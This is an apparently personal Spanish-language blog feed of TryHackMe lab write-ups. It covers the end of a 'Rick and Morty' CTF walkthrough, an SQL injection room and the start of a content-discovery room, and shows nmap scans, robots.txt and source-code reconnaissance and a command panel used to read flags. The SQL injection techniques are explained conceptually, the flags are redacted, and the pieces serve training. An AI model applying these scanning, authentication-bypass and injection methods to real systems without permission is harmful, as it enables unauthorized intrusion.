&lt;p&gt;Como vemos, la maquina esta activa y mediante su &lt;em&gt;ttl&lt;/em&gt; vemos que nos enfrentamos a una maquina linux, podemos confirmarlo con la 
herramiente &lt;em&gt;wichSystem&lt;/em&gt;&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ wichSystem.py 10.10.103.222

10.10.103.222 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ttl -&amp;gt; 63&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;: Linux
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;ahora-si-pasamos-a-la-maquina&quot;&gt;Ahora si pasamos a la maquina&lt;/h2&gt;

&lt;p&gt;inicamos con un escaneo de los puertos con &lt;em&gt;nmap&lt;/em&gt;&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ &lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;nmap &lt;span class=&quot;nt&quot;&gt;-p-&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--open&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--min-rate&lt;/span&gt; 5000 &lt;span class=&quot;nt&quot;&gt;-sS&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-Pn&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-n&lt;/span&gt; 10.10.103.222 &lt;span class=&quot;nt&quot;&gt;-oG&lt;/span&gt; allPorts
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; password &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;blanco: 
Sorry, try again.
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; password &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;blanco: 
Starting Nmap 7.92 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; https://nmap.org &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; at 2021-11-23 07:31 &lt;span class=&quot;nt&quot;&gt;-05&lt;/span&gt;
Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;10.10.103.222
Host is up &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.64s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
Not shown: 52888 filtered tcp ports &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;no-response&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, 12645 closed tcp ports &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;reset&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
Some closed ports may be reported as filtered due to &lt;span class=&quot;nt&quot;&gt;--defeat-rst-ratelimit&lt;/span&gt;
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;para ver el resultado usamos la utilidad &lt;em&gt;extracPorts&lt;/em&gt; de una vez nos copia los puertos en la &lt;em&gt;clipboard&lt;/em&gt;&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;
❯ extractPorts allPorts

   1   │ 
   2   │ &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Extracting information...
   3   │ 
   4   │     &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; IP Address: 10.10.103.222
   5   │     &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Open ports: 22,80
   6   │ 
   7   │ &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Ports copied to clipboard
   8   │ 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h2 id=&quot;pasamos-a-verificar-alguna-posible-vulnerabilidad-en-los-puertos-y-que-servicios-estan-corriendo&quot;&gt;Pasamos a verificar alguna posible vulnerabilidad en los puertos y que servicios estan corriendo&lt;/h2&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ nmap &lt;span class=&quot;nt&quot;&gt;-sV&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-sC&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p22&lt;/span&gt;,80 10.10.103.222 &lt;span class=&quot;nt&quot;&gt;-oN&lt;/span&gt; targeted
Starting Nmap 7.92 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; https://nmap.org &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; at 2021-11-23 07:58 &lt;span class=&quot;nt&quot;&gt;-05&lt;/span&gt;
Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;10.10.103.222
Host is up &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.17s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.6 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ubuntu Linux&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; protocol 2.0&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
| ssh-hostkey: 
|   2048 8c:de:05:eb:09:98:e3:02:6c:f8:51:a8:1f:60:29:73 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;RSA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
|   256 0f:90:05:4c:66:4d:9f:45:b5:7e:17:19:9d:4f:b1:9e &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ECDSA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
|_  256 bd:89:54:37:04:e5:07:bf:0d:fc:7b:1a:b0:f7:47:c9 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ED25519&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
80/tcp open  http    Apache httpd 2.4.18 &lt;span class=&quot;o&quot;&gt;((&lt;/span&gt;Ubuntu&lt;span class=&quot;o&quot;&gt;))&lt;/span&gt;
|_http-server-header: Apache/2.4.18 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ubuntu&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
|_http-title: Rick is sup4r cool
Service Info: OS: Linux&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
Nmap &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;: 1 IP address &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1 host up&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; scanned &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;13.32 seconds
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;No vemos nada que sea interesante y/o nos llame la atencion, pasamos usar &lt;em&gt;gobuster&lt;/em&gt; y buscar posibles directorios, esperamos
a que termine de cargar el escanero.&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;vemos el index del sitio web de la maquina&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/rick/index.png&quot; alt=&quot;index&quot; /&gt;&lt;/p&gt;

&lt;p&gt;verificando el codigo fuente del index encontramos un nombre de usuario, lo guardamos para mas adelante&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/rick/codigo.png&quot; alt=&quot;codigo&quot; /&gt;&lt;/p&gt;

&lt;p&gt;verificamos en &lt;em&gt;robots.txt&lt;/em&gt; y vemos si hay algo que nos llame la atención&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/rick/robots.png&quot; alt=&quot;robot&quot; /&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Probamos la posible contraseña con el usuario que ya tenemos de antes&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/rick/porta.png&quot; alt=&quot;portal&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;tenemos-acceso-inical&quot;&gt;Tenemos acceso “inical”&lt;/h2&gt;

&lt;p&gt;vemos que tenemos un &lt;em&gt;input&lt;/em&gt; el cual nos permite ejecutar ciertos comandos de linux&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;Tenemos la primer &lt;em&gt;flag&lt;/em&gt;&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Encontramos una pista, y nos dice que debemos buscar en los archivos de sistema el otro ingrediente&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Luego de una busqueda en las rutas y ver que &lt;em&gt;cat&lt;/em&gt; (entre otros comandos) no permite leer &lt;em&gt;second ingredients&lt;/em&gt; probe mejor suerte
con google y &lt;a href=&quot;https://computernewage.com/2013/05/14/como-leer-archivos-de-texto-desde-la-terminal-de-linux/&quot;&gt;aqui&lt;/a&gt; pude leer un poco
sobre &lt;em&gt;less&lt;/em&gt;, probe con este comando y si permite ejecutarlo&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/rick/2flag.png&quot; alt=&quot;2flag&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;user-root&quot;&gt;user root&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;pasamos a la fase de escala de privilegios&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;probamos corrar &lt;em&gt;sudo id&lt;/em&gt; y ver que nos devuelve&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/rick/sudo.png&quot; alt=&quot;sudo&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Para sorpresa del caso, no requiere escalar privilegios puesto que ya nos permite ejecutar comandos con &lt;em&gt;sudo&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;Solo falta encontrar el 3 ingrediente&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/rick/flag3.png&quot; alt=&quot;flag3&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/rick/3flag.png&quot; alt=&quot;3flag&quot; /&gt;&lt;/p&gt;</content><author><name>Deiby Espinosa</name><email>deibysp39@gmail.com</email></author><category term="tryhackme" /><category term="Web Server" /><category term="Gobuster" /><summary type="html">Un CTF de Rick y Morty. ¡Ayuda a que Rick vuelva a ser humano!</summary></entry><entry><title type="html">tryhackme: SQLInjection</title><link href="http://localhost:4000/SQLInjection/" rel="alternate" type="text/html" title="tryhackme: SQLInjection" /><published>2021-11-19T00:00:00-05:00</published><updated>2021-11-19T00:00:00-05:00</updated><id>http://localhost:4000/SQLInjection</id><content type="html" xml:base="http://localhost:4000/SQLInjection/">&lt;ul&gt;
  &lt;li&gt;Conocida principalmente como &lt;em&gt;SQLI&lt;/em&gt;, es un ataque a un servidor de base de datos de aplicaciones web que proboca la ejecución
de consultas maliciosas&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;iniciamos&quot;&gt;Iniciamos&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;SQL es un lenguaje de dominio específico utilizado en programación, diseñado para administrar, y recuperar información de 
sistemas de gestión de bases de datos relacionales.&lt;/li&gt;
&lt;/ul&gt;

&lt;blockquote&gt;
  &lt;p&gt;¿Qué significa SQL?&lt;br /&gt;
Structured Query Language&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h2 id=&quot;qué-es-una-base-de-datos&quot;&gt;Qué es una base de datos?&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;Una base de datos es una forma de almacenar electrónicamente colecciones de datos de manera organizada.&lt;/li&gt;
  &lt;li&gt;Una base de datos es una recopilación organizada de información o datos estructurados, que normalmente 
se almacena de forma electrónica en un sistema informático.&lt;/li&gt;
  &lt;li&gt;Normalmente, una base de datos está controlada por un sistema de gestión de bases de datos (DBMS).&lt;/li&gt;
  &lt;li&gt;En conjunto, los datos y el DBMS, junto con las aplicaciones asociadas a ellos, reciben el nombre de 
sistema de bases de datos, abreviado normalmente a simplemente base de datos.&lt;/li&gt;
&lt;/ul&gt;

&lt;blockquote&gt;
  &lt;p&gt;¿Cuál es el acrónimo del software que controla una base de datos?&lt;br /&gt;
DBMS&lt;/p&gt;
&lt;/blockquote&gt;

&lt;blockquote&gt;
  &lt;p&gt;¿Cuál es el nombre de la estructura en forma de cuadrícula que contiene los datos? &lt;br /&gt;
table&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h2 id=&quot;qué-es-sql&quot;&gt;¿Qué es SQL?&lt;/h2&gt;

&lt;blockquote&gt;
  &lt;p&gt;¿Qué declaración SQL se utiliza para recuperar datos?&lt;br /&gt;
select&lt;/p&gt;
&lt;/blockquote&gt;

&lt;ul&gt;
  &lt;li&gt;example: &lt;em&gt;SELECT * FROM nameTable;&lt;/em&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;blockquote&gt;
  &lt;p&gt;¿Qué cláusula de SQL se puede utilizar para recuperar datos de varias tablas?&lt;br /&gt;
union&lt;/p&gt;
&lt;/blockquote&gt;

&lt;ul&gt;
  &lt;li&gt;SELECT City FROM tabla1 UNION SELECT City FROM tabla2;&lt;/li&gt;
&lt;/ul&gt;

&lt;blockquote&gt;
  &lt;p&gt;Cual es la declaracion usada para agregar datos?&lt;br /&gt;
inset&lt;/p&gt;
&lt;/blockquote&gt;

&lt;ul&gt;
  &lt;li&gt;INSERT INTO database (Name, City, Country) VALUES (‘Tom’, ‘4006’, ‘Norway’);&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;qué-es-sql-injection&quot;&gt;Qué es SQL Injection?&lt;/h2&gt;

&lt;blockquote&gt;
  &lt;p&gt;¿Qué carácter significa el final de una consulta SQL?&lt;br /&gt;
;&lt;/p&gt;
&lt;/blockquote&gt;

&lt;ul&gt;
  &lt;li&gt;Insert into database (nombre) values(‘sql server’);&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;in-band-sqli&quot;&gt;In-Band SQLi&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;Inyección SQL en banda&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;In-Band SQL Injection es el tipo más fácil de detectar y explotar; In-Band solo se refiere al mismo método de comunicación que se utiliza para explotar la vulnerabilidad y también recibir los resultados, por ejemplo, descubrir una vulnerabilidad de inyección SQL en una página web y luego poder extraer datos de la base de datos a la misma página.&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/sqli/one.png&quot; alt=&quot;sqli band&quot; /&gt;&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;What is the flag after completing level 1?&lt;br /&gt;
THM{xxx_INJECTION_xxxx}&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h2 id=&quot;blind-sqli---authentication-bypass&quot;&gt;Blind SQLi - Authentication Bypass&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;A diferencia de la inyección SQL en banda, donde podemos ver los resultados de nuestro ataque directamente en la pantalla, SQLi ciego es cuando recibimos poca o ninguna retroalimentación para confirmar si nuestras consultas inyectadas fueron, de hecho, exitosas o no, esto se debe a que Los mensajes de error se han desactivado, pero la inyección sigue funcionando independientemente.&lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Puede que le sorprenda que todo lo que necesitamos es un poco de retroalimentación para enumerar con éxito una base de datos completa&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;&lt;em&gt;Authentication Bypass&lt;/em&gt;&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;Una de las técnicas de inyección SQL ciega más sencillas es cuando se omiten los métodos de autenticación, como los formularios de inicio de sesión. En este caso, no estamos tan interesados en recuperar datos de la base de datos; Solo queremos pasar del inicio de sesión.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/sqli/two.png&quot; alt=&quot;sqli bypass&quot; /&gt;&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;What is the flag after completing level two? (and moving to level 3)&lt;br /&gt;
THM{xxx_INJECTION_xxxx}&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h2 id=&quot;blind-sqli---boolean-based&quot;&gt;Blind SQLi - Boolean Based&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;La inyección SQL basada en booleanos se refiere a la respuesta que recibimos de nuestros intentos de inyección, que podría ser verdadero/falso, sí/no, encendido/apagado, 1/0 o cualquier respuesta que solo pueda tener dos resultados.&lt;/li&gt;
  &lt;li&gt;Ese resultado nos confirma que nuestra carga útil de inyección SQL fue exitosa o no.&lt;/li&gt;
  &lt;li&gt;En la primera inspección, es posible que sienta que esta respuesta limitada no puede proporcionar mucha información.&lt;/li&gt;
  &lt;li&gt;Aún así, de hecho, con solo estas dos respuestas, es posible enumerar la estructura y el contenido de una base de datos completa.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/sqli/tree.png&quot; alt=&quot;tres&quot; /&gt;&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;¿Qué es la bandera después de completar el nivel tres? &lt;br /&gt;
THM{xxx_INJECTION_xxxx}&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h2 id=&quot;blind-sqli---time-based&quot;&gt;Blind SQLi - Time Based&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;Basado en el tiempo - Time based&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;Una inyección SQL ciega basada en el tiempo es muy similar a la basada en booleanos anterior, en el sentido de que se envían las mismas solicitudes, pero no hay un indicador visual de que sus consultas sean incorrectas o correctas esta vez. En cambio, su indicador de una consulta correcta se basa en el tiempo que tarda la consulta en completarse.&lt;/li&gt;
  &lt;li&gt;Este retraso de tiempo se introduce mediante el uso de métodos integrados como SLEEP (x) junto con la instrucción UNION.&lt;/li&gt;
  &lt;li&gt;El método SLEEP () solo se ejecutará con una declaración UNION SELECT exitosa.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/sqli/four.png&quot; alt=&quot;cuarta&quot; /&gt;&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;¿Cuál es la bandera final después de completar el nivel cuatro?&lt;br /&gt;
THM{xxx_INJECTION_xxxxxx}&lt;/p&gt;
&lt;/blockquote&gt;</content><author><name>Deiby Espinosa</name><email>deibysp39@gmail.com</email></author><category term="tryhackme" /><category term="database" /><category term="sql injection" /><summary type="html">Aprenda a detectar y aprovechar las vulnerabilidades de inyección SQL</summary></entry><entry><title type="html">tryhackme: Content Discovery</title><link href="http://localhost:4000/discovery/" rel="alternate" type="text/html" title="tryhackme: Content Discovery" /><published>2021-11-18T00:00:00-05:00</published><updated>2021-11-18T00:00:00-05:00</updated><id>http://localhost:4000/discovery</id><content type="html" xml:base="http://localhost:4000/discovery/">&lt;h3 id=&quot;iniciamos&quot;&gt;iniciamos&lt;/h3&gt;

&lt;p&gt;Realizamos un primer escaneo con &lt;em&gt;nmap&lt;/em&gt; para ver los puertos abiertos e iniciar a “jugar” con la maquina&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ &lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;nmap &lt;span class=&quot;nt&quot;&gt;--open&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--min-rate&lt;/span&gt; 5000 &lt;span class=&quot;nt&quot;&gt;-sS&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-Pn&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-n&lt;/span&gt; 10.10.234.170 &lt;span class=&quot;nt&quot;&gt;-oG&lt;/span&gt; allPorts
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; password &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;blanco: 
Starting Nmap 7.92 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; https://nmap.org &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; at 2021-11-18 07:43 &lt;span class=&quot;nt&quot;&gt;-05&lt;/span&gt;
Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;10.10.234.170
Host is up &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.17s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
Not shown: 997 closed tcp ports &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;reset&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
9999/tcp open  abyss

Nmap &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;: 1 IP address &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1 host up&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; scanned &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;1.21 seconds
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;usamos la utilidad &lt;em&gt;extractPorts&lt;/em&gt; para ver el escaneo mejor y copiar los puertos con la clipboard&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; extractPorts allPorts
   1   │ 
   2   │ &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Extracting information...
   3   │ 
   4   │     &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; IP Address: 10.10.234.170
   5   │     &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Open ports: 22,80,9999
   6   │ 
   7   │ &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Ports copied to clipboard
   8   │ 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Hacemos un escaneo de los puertos buscando encontrar los servicios que corren en ellos y posibles vulnerabilidades&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ &lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;nmap &lt;span class=&quot;nt&quot;&gt;-sC&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-sV&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p22&lt;/span&gt;,80,9999 10.10.234.170 &lt;span class=&quot;nt&quot;&gt;-oN&lt;/span&gt; targeted
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; password &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;blanco: 
Starting Nmap 7.92 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; https://nmap.org &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; at 2021-11-18 08:17 &lt;span class=&quot;nt&quot;&gt;-05&lt;/span&gt;
Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;10.10.234.170
Host is up &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.58s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ubuntu Linux&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; protocol 2.0&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
| ssh-hostkey: 
|   3072 24:9a:44:23:9d:ab:2a:85:0e:25:b9:62:ae:87:d0:49 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;RSA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
|   256 54:c0:1f:36:ee:56:c2:39:44:4f:6c:f0:29:a4:76:d2 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ECDSA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
|_  256 1a:7d:d2:6f:b7:1f:fc:8b:05:63:10:b6:e9:42:70:96 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ED25519&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
80/tcp   open  http    nginx 1.18.0 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ubuntu&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
| http-robots.txt: 1 disallowed entry 
|_/staff-portal
|_http-server-header: nginx/1.18.0 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ubuntu&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
|_http-title: Acme IT Support - Home
9999/tcp open  http    nginx 1.18.0 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ubuntu&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
|_http-title: Site doesn&lt;span class=&quot;s1&quot;&gt;'t have a title (text/html; charset=UTF-8).
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.13 seconds
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;vamos-respondiendo-las-preguntas-mientras-jugamos-con-la-maquina&quot;&gt;Vamos respondiendo las preguntas mientras “jugamos” con la maquina&lt;/h3&gt;

&lt;h2 id=&quot;what-is-content-discovery&quot;&gt;What Is Content Discovery?&lt;/h2&gt;

&lt;blockquote&gt;
  &lt;p&gt;What is the Content Discovery method that begins with M?&lt;br /&gt;
Manually&lt;/p&gt;
&lt;/blockquote&gt;

&lt;blockquote&gt;
  &lt;p&gt;What is the Content Discovery method that begins with A?&lt;br /&gt;
Automated&lt;/p&gt;
&lt;/blockquote&gt;

&lt;blockquote&gt;
  &lt;p&gt;What is the Content Discovery method that begins with O?&lt;br /&gt;
Osint&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h2 id=&quot;manual-discovery---robotstxt&quot;&gt;Manual Discovery - Robots.txt&lt;/h2&gt;

&lt;p&gt;en la &lt;em&gt;url&lt;/em&gt; solo agregamos &lt;em&gt;robots.txt&lt;/em&gt; y encontramos &lt;em&gt;robots.txt&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/discovery/robots.png&quot; alt=&quot;robots.txt&quot; /&gt;&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;What is the directory in the robots.txt that isn’t allowed to be viewed by web crawlers?&lt;br /&gt;
/staff-portal&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h2 id=&quot;manual-discovery---favicon&quot;&gt;Manual Discovery - Favicon&lt;/h2&gt;

&lt;blockquote&gt;
  &lt;p&gt;What framework did the favicon belong to?&lt;br /&gt;
cgiirc&lt;/p&gt;
&lt;/blockquote&gt;

